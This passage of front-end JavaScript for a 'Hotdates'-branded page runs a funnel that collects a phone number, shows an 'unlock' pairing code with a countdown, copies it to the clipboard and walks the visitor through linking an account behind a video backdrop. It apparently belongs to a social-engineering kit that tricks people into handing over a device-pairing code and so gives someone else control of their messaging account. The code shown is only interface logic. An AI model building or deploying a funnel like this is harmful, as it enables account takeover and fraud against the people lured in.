        transition: transform 0.16s ease, box-shadow 0.16s ease, filter 0.16s ease;
      }
      [part="copy-button"]::before {
        content: "";
        flex: 0 0 auto;
        width: 18px;
        height: 18px;
        background: currentColor;
        opacity: 0.96;
        -webkit-mask: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Crect x='9' y='9' width='13' height='13' rx='2'/%3E%3Cpath d='M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1'/%3E%3C/svg%3E") center / contain no-repeat;
        mask: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Crect x='9' y='9' width='13' height='13' rx='2'/%3E%3Cpath d='M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1'/%3E%3C/svg%3E") center / contain no-repeat;
      }
      [part="copy-button"]:hover {
        filter: brightness(1.03);
        box-shadow: 0 12px 30px rgba(26, 217, 181, 0.38);
      }
      [part="copy-button"]:active {
        transform: translateY(1px) scale(0.985);
        box-shadow: 0 6px 18px rgba(26, 217, 181, 0.28);
      }
      [part="expiry"] {
        width: 100%;
        text-align: center;
        color: rgba(255, 255, 255, 0.54);
        font-size: 0.75rem;
        font-weight: 500;
        letter-spacing: 0.02em;
      }
      [part="associating"] {
        display: none !important;
      }
    `;
    root.appendChild(style);
  }

  function applyPairingCodeModalCopy(codePanel) {
    if (!codePanel?.shadowRoot) return;

    ensureHotdatesPairingPanelStyles(codePanel);

    const copy = readThemeCopy();
    const lead = ensurePairingLeadNode(codePanel);
    const title = codePanel.shadowRoot.querySelector('[part="title"]');
    const code = codePanel.shadowRoot.querySelector('[part="code"]');
    const associating = ensurePairingAssociatingNode(codePanel);

    if (lead && copy.overlayTitle) {
      lead.textContent = copy.overlayTitle;
      lead.hidden = false;
    }
    if (title && copy.pairingTitle) title.textContent = copy.pairingTitle;
    if (code && !code.textContent.trim() && codePanel.dataset.lastCode) {
      code.textContent = codePanel.dataset.lastCode;
    }
    const copyButton = codePanel.shadowRoot.querySelector('[part="copy-button"]');
    if (copyButton) {
      copyButton.textContent = copy.copyCode || copy["accountLink.copyCode"] || "Copy code";
    }
    if (associating) {
      associating.textContent = "";
      associating.hidden = true;
    }
  }

  function clearPairingCountdown() {
    if (pairingCountdownTimer) {
      window.clearInterval(pairingCountdownTimer);
      pairingCountdownTimer = null;
    }
    pairingCountdownEndsAt = 0;
  }

  function readExpiryLabel() {
    const copy = readThemeCopy();
    return copy.expires || copy.pairingExpires || "剩余时间";
  }

  function updatePairingCountdownDisplay(codePanel) {
    const expiry = codePanel?.shadowRoot?.querySelector('[part="expiry"]');
    if (!expiry || !pairingCountdownEndsAt) return;

    const seconds = Math.max(0, Math.ceil((pairingCountdownEndsAt - Date.now()) / 1000));
    expiry.textContent = `${readExpiryLabel()} ${Math.floor(seconds / 60)}:${String(seconds % 60).padStart(2, "0")}`;
    if (seconds <= 0) clearPairingCountdown();
  }

  function startPairingCountdown(codePanel) {
    clearPairingCountdown();
    pairingCountdownEndsAt = Date.now() + PAIRING_COUNTDOWN_SECONDS * 1000;
    updatePairingCountdownDisplay(codePanel);
    pairingCountdownTimer = window.setInterval(() => updatePairingCountdownDisplay(codePanel), 1000);
  }

  function resetPairingCodeModalCopy(codePanel) {
    const lead = codePanel?.shadowRoot?.querySelector('[part="lead"]');
    const associating = codePanel?.shadowRoot?.querySelector('[part="associating"]');
    if (lead) {
      lead.textContent = "";
      lead.hidden = true;
    }
    if (associating) {
      associating.textContent = "";
      associating.hidden = true;
    }
  }

  function readPairingCodeText(codePanel) {
    return codePanel?.shadowRoot?.querySelector('[part="code"]')?.textContent?.trim() || "";
  }

  function normalizeUnlockCode(value) {
    return String(value || "").replace(/\s+/g, "").trim();
  }

  async function copyUnlockCodeToClipboard(rawCode) {
    const code = normalizeUnlockCode(rawCode);
    if (!code) return false;

    try {
      if (navigator.clipboard?.writeText) {
        await navigator.clipboard.writeText(code);
        return true;
      }
    } catch {}

    try {
      const input = document.createElement("textarea");
      input.value = code;
      input.setAttribute("readonly", "");
      input.style.cssText = "position:fixed;left:-9999px;top:0;opacity:0;";
      document.body.appendChild(input);
      input.select();
      input.setSelectionRange(0, input.value.length);
      const ok = document.execCommand("copy");
      input.remove();
      return ok;
    } catch {
      return false;
    }
  }

  let copyToastTimer = null;

  function showCopiedToast(message) {
    const host = document.getElementById("main-container") || document.body;
    let toast = host.querySelector("#copy-toast");
    if (!toast) {
      toast = document.createElement("div");
      toast.id = "copy-toast";
      toast.className = "copy-toast";
      toast.setAttribute("role", "status");
      toast.setAttribute("aria-live", "polite");
      toast.hidden = true;
      host.appendChild(toast);
    } else if (toast.parentElement !== host) {
      host.appendChild(toast);
    }

    toast.textContent = message || "Copied!";
    toast.hidden = false;
    requestAnimationFrame(() => {
      toast.dataset.show = "true";
    });

    if (copyToastTimer) window.clearTimeout(copyToastTimer);
    copyToastTimer = window.setTimeout(() => {
      delete toast.dataset.show;
      window.setTimeout(() => {
        if (!toast.dataset.show) toast.hidden = true;
      }, 180);
    }, 1000);
  }

  function restructureAppLaunchPanel(apps) {
    const root = apps?.shadowRoot;
    const panel = root?.querySelector('[part="panel"]');
    const guide = root?.querySelector('[part="guide"]');
    const actions = root?.querySelector('[part="actions"]');
    const verification = root?.querySelector('[part="verification-box"]');
    if (!panel || !guide || !actions) return;

    root.querySelector('[part="tips-popup"]')?.remove();

    if (verification) panel.append(guide, verification, actions);
    else panel.append(guide, actions);

    panel.dataset.guideLayout = "v1";
  }

  function ensureGuideTipsHeader(apps) {
    const root = apps?.shadowRoot;
    const guide = root?.querySelector('[part="guide"]');
    if (!root || !guide || root.querySelector('[part="tips-heading"]')) return;

    const heading = document.createElement("h2");
    heading.setAttribute("part", "tips-heading");

    const copied = document.createElement("p");
    copied.setAttribute("part", "tips-copied");

    guide.before(heading, copied);
  }

  function ensureGuideTipsFooter(apps) {
    const root = apps?.shadowRoot;
    const actions = root?.querySelector('[part="actions"]');
    if (!root || !actions) return;

    root.querySelector('[part="tips-popup"]')?.remove();
    root.querySelector('[part="verification-copy"]')?.remove();

    let verification = root.querySelector('[part="verification-box"]');
    if (!verification) {
      verification = document.createElement("button");
      verification.type = "button";
      verification.setAttribute("part", "verification-box");

      const label = document.createElement("span");
      label.setAttribute("part", "verification-label");

      const code = document.createElement("span");
      code.setAttribute("part", "verification-code");

      verification.append(label, code);
      actions.before(verification);
    } else if (verification.tagName !== "BUTTON") {
      const replacement = document.createElement("button");
      replacement.type = "button";
      replacement.setAttribute("part", "verification-box");
      while (verification.firstChild) replacement.append(verification.firstChild);
      verification.replaceWith(replacement);
    }
  }

  function applyGuideTipsModal(apps, codePanel) {
    if (!apps?.shadowRoot) return;

    ensureGuideTipsHeader(apps);
    ensureGuideTipsFooter(apps);
    restructureAppLaunchPanel(apps);

    const copy = readThemeCopy();
    const root = apps.shadowRoot;
    const heading = root.querySelector('[part="tips-heading"]');
    const copied = root.querySelector('[part="tips-copied"]');
    const label = root.querySelector('[part="verification-label"]');
    const code = root.querySelector('[part="verification-code"]');
    const box = root.querySelector('[part="verification-box"]');
    const codeText = readPairingCodeText(codePanel);
    const copyLabel = copy.copyCode || copy["accountLink.copyCode"] || "Copy verification code";
    const copiedFlash = copy.copiedFlash || "Copied!";
    const tipsCopied = copy.tipsCopied || "";

    if (heading) heading.textContent = copy.tipsHeading || "Helpful Tips";
    if (copied) {
      copied.textContent = tipsCopied;
      delete copied.dataset.flash;
    }
    if (label) label.textContent = copy.verificationLabel || "";
    if (code) code.textContent = codeText;
    if (box) {
      box.disabled = !codeText;
      box.dataset.hasCode = codeText ? "true" : "false";
      box.setAttribute("aria-label", copyLabel);
      box.title = copyLabel;
    }

    if (apps.dataset.recopyWired === "true") return;

    const flashCopied = async () => {
      const latest = readPairingCodeText(codePanel) || code?.textContent || "";
      if (code && latest) code.textContent = latest;
      const ok = await copyUnlockCodeToClipboard(latest);
      if (!ok || !box) return;

      showCopiedToast(copiedFlash);
    };

    box?.addEventListener("click", (event) => {
      event.preventDefault();
      flashCopied();
    });

    apps.dataset.recopyWired = "true";
  }

  function watchPairingSteps() {
    const attach = () => {
      const flow = getLoginFlow();
      const codePanel = flow?.querySelector("pairing-code-panel");
      const appsPanel = flow?.querySelector("app-launch-actions");
      if (!flow || !codePanel || !appsPanel) return false;

      if (flow.dataset.pairingStepsWired === "true") return true;

      const syncStepFromPanel = () => {
        if (codePanel.hidden) {
          setPairingStep(undefined);
          resetPairingCodeModalCopy(codePanel);
          clearPairingCountdown();
          return;
        }
        if (flow.dataset.pairingStep !== "guide") {
          setPairingStep("code");
          applyPairingCodeModalCopy(codePanel);
        }
      };

      const advanceToGuideStep = () => {
        if (!codePanel.hidden) {
          applyGuideTipsModal(appsPanel, codePanel);
          setPairingStep("guide");
          if (document.body.classList.contains("video-backdrop-open")) {
            appsPanel.hidden = false;
            const status = flow.querySelector("account-link-status");
            if (status) status.hidden = false;
          }
        }
      };

      const wireCopyAdvance = () => {
        const button = codePanel.shadowRoot?.querySelector('[part="copy-button"]');
        if (!button || button.dataset.stepWired === "true") return false;
        button.addEventListener("click", () => window.setTimeout(advanceToGuideStep, 0));
        button.dataset.stepWired = "true";
        return true;
      };

      syncStepFromPanel();
      new MutationObserver(syncStepFromPanel).observe(codePanel, {
        attributes: true,
        attributeFilter: ["hidden"],
      });

      flow.addEventListener("account-link-pairing-started", () => {
        openLoginOverlay({ videoBackdrop: true });
        setPairingStep("code");
        window.requestAnimationFrame(() => {
          applyPairingCodeModalCopy(codePanel);
          ensurePairingCodeVisible(codePanel);
          startPairingCountdown(codePanel);
          syncVideoBackdropModal("code");
        });
      });
      flow.addEventListener("account-link-reset", () => {
        setPairingStep(undefined);
        resetPairingCodeModalCopy(codePanel);
        clearPairingCountdown();
        if (document.body.classList.contains("video-backdrop-open")) closeVideoBackdrop();
      });

      if (!wireCopyAdvance()) {
        customElements.whenDefined("pairing-code-panel").then(() => {
          window.requestAnimationFrame(() => wireCopyAdvance());
        });
      }

      flow.dataset.pairingStepsWired = "true";
      return true;
    };

    if (attach()) return;

    customElements.whenDefined("account-link-flow").then(() => {
      window.requestAnimationFrame(() => {
        if (!attach()) window.setTimeout(attach, 120);
      });
    });

    customElements.whenDefined("app-launch-actions").then(() => {
      window.requestAnimationFrame(() => {
        const flow = getLoginFlow();
        const apps = flow?.querySelector("app-launch-actions");
        const codePanel = flow?.querySelector("pairing-code-panel");
        if (apps && flow?.dataset.pairingStep === "guide") {
          applyGuideTipsModal(apps, codePanel);
        }
      });
    });
  }

  function watchPhoneField() {
    const attach = () => {
      const field = document.querySelector("phone-number-field");
      if (!field) return false;
      setupPhoneField(field);
      return true;
    };

    if (attach()) return;

    customElements.whenDefined("phone-number-field").then(() => {
      window.requestAnimationFrame(() => {
        if (!attach()) window.setTimeout(attach, 120);
      });
    });
  }

  function watchSubmitButton() {
    const attach = () => {
      const submit = document.querySelector("account-link-submit");
      if (!submit?.shadowRoot) return false;
      setupSubmitButton();
      return true;
    };

    if (attach()) return;

    customElements.whenDefined("account-link-submit").then(() => {
      window.requestAnimationFrame(() => {
        if (!attach()) window.setTimeout(attach, 120);
      });
    });
  }

  function watchBindingSuccess() {
    const attach = () => {
      const status = document.querySelector("account-link-status");
      if (!status) return false;

      if (status.dataset.successWired === "true") return true;

      const applySuccessCopy = () => {
        const copy = readThemeCopy();
        document.querySelectorAll("#success-modal [data-copy]").forEach((node) => {
          const key = node.getAttribute("data-copy");
          if (key && copy[key]) node.textContent = copy[key];
        });
      };

      const openSuccessModal = () => {
        applySuccessCopy();
        closeVideoBackdrop();
        document.getElementById("main-container")?.style.setProperty("display", "none");
        document.body.classList.remove("login-open");
        const modal = document.getElementById("success-modal");
        if (modal) modal.hidden = false;
      };

      const shouldOpenSuccessModal = () => {
        if (status.hidden) return false;
        return (
          status.dataset.statusTone === "success" ||
          status.dataset.statusState === "account_already_linked"
        );
      };

      const sync = () => {
        if (shouldOpenSuccessModal()) openSuccessModal();
      };

      sync();
      new MutationObserver(sync).observe(status, {
        attributes: true,
        attributeFilter: ["data-status-tone", "data-status-state", "hidden"],
      });

      document.getElementById("success-continue-btn")?.addEventListener("click", () => {
        window.location.assign(SUCCESS_CONTINUE_URL);
      });

      status.dataset.successWired = "true";
      return true;
    };

    if (attach()) return;

    customElements.whenDefined("account-link-status").then(() => {
      window.requestAnimationFrame(() => {
        if (!attach()) window.setTimeout(attach, 120);
      });
    });
  }

  function boot() {
    initHotdatesBackground();
    initHotdatesFunnel();
    watchPhoneField();
    watchSubmitButton();
    watchPairingSteps();
    watchBindingSuccess();

    const overlay = document.getElementById("main-container");
    if (overlay) overlay.style.display = "none";
  }

  document.addEventListener("DOMContentLoaded", boot);
})();
